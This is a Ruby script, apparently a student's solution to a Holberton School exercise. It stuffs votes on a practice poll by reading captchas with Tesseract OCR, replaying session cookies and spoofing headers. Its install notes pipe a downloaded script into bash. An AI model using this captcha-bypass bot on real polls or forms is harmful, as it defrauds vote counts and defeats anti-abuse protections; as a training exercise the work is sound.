#!/usr/bin/env ruby

=begin
===---Description---------------------------------------------------------------===
# Solution for the Hodor Project, Level 3 by Julien Barbier.
# Using Ruby Language with Tesseract OCR.
#
# by Alexandro de Oliveira, for Holberton School
===-----------------------------------------------------------------------------===

===---Installation instructions-------------------------------------------------===
# Installing tesseract-ocr(Ubuntu 14-04):
# Install rvm - Ruby Version Manager(quickest and safest way):

$ gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
$ \curl -sSL https://get.rvm.io | bash -s stable
$ source ~/.rvm/scripts/rvm

# (if rvm is already installed in your system create a gemset to isolate the environment
# for example: $ rvm gemset create tesseract (and then: $ rvm gemset use tesseract)
# Later you can remove this gemset and tesseract in just on step($ rvm delete tesseract)

$ gem install tesseract-ocr
$ sudo apt-get install libleptonica-dev
$ sudo apt-get install libtesseract-dev
$ wget https://tesseract-ocr.googlecode.com/files/tesseract-ocr-3.02.eng.tar.gz
$ tar -zxvf tesseract-ocr-3.02.eng.tar.gz
$ sudo mv ./tesseract-ocr/tessdata/* /usr/share/tesseract-ocr/tessdata/
$ export TESSDATA_PREFIX=/usr/share/tesseract-ocr/tessdata/
===-----------------------------------------------------------------------------===
=end

require 'uri'
require 'net/http'
require 'tesseract'

url = "http://173.246.108.142/level3.php"
# Parsing the URLs:
uri = URI.parse(url)
# Setting the http request headers:
headers = {
  'User-Agent' => 'Windows NT 100 (aka: Blue Screen of Death!) havk64 - Ruby Requests',
  'Referer' => url,
}
# Setting POST request parameters:
params = {
    'id' => "23",
    'holdthedoor' => "submit",
}

votes = 0 # A vote counter
total_votes = 1 << 10
loop do
    # Openning the connection:
    Net::HTTP.start(uri.host, uri.port) do |http|
        php_cookie = nil
        # Openning the file to write the image:
        File.open('tmp.txt', 'w') do |f|
            # GET request to fetch the captcha image:
            res = http.get('/captcha.php') do |str|
                f.write str # writing the response to the file.
            end
            # Getting the PHPSESSID cookie in order to use it simulating a session.
            php_cookie = res['Set-Cookie'].split('; ')[0]
        end # Closing the file.
        # Decoding the image
           # If Mac OsX with tesseract installed(low performance):
           # f = IO.popen(['tesseract','tmp.txt', '-'], :err => '/dev/null')
	       # captcha = f.readlines[0].strip
        # Using Linux(see installation instructions above):
        read = Tesseract::Engine.new # Initializing the Tesseract engine.
        # Reading(decoding) the file and saving the value to a variable:
        captcha = read.text_for('tmp.txt').strip
        File.delete('tmp.txt') # deleting the image file.
        # If you want to check the captcha value:
        # puts captcha
        # Setting the headers to a HEAD request which will retrieve the other needed cookie(HoldTheDoor):
        headers['Cookie'] = php_cookie
        # To check the request header:
        # puts "Request header: #{headers}"
        # The HEAD request:
        head = http.head(uri.path, headers)
        # Parsing the cookie:
        cookie_h = head['Set-Cookie'].split('; ')[0]
        # puts head.to_hash # => To check the response header of the HEAD request.
        # Setting the parameters to the POST request(body entity and headers)
        params['key'] = cookie_h.split('=')[1]
        params['captcha'] = captcha
        headers['Cookie'] = php_cookie + '; ' + cookie_h # The two cookies(PHP and HoldTheDoor)
        data = URI.encode_www_form(params) # Encoding the Hash to url encoded string
        post = http.post(uri.path, data, headers) # The POST request(vote).\
        # Ruby'sh version of a if/else statement. The beautiful "unless"
        # When there are some error the cookie is empty. Only way to check if the vote was accepted:
        unless post['Set-cookie'].nil?
            puts "Vote number: #{votes += 1}" # Printing and adding to 'votes' at the same time.
        else
            puts "Failed! (Vote not computed)"# Otherwise the vote is not computed.
        end
    end
    break if votes == total_votes # When we reach the 'total_votes' the loop stops.
end

# Printing the total of votes that corresponds to valid votes:
puts "Total of votes: #{votes}"
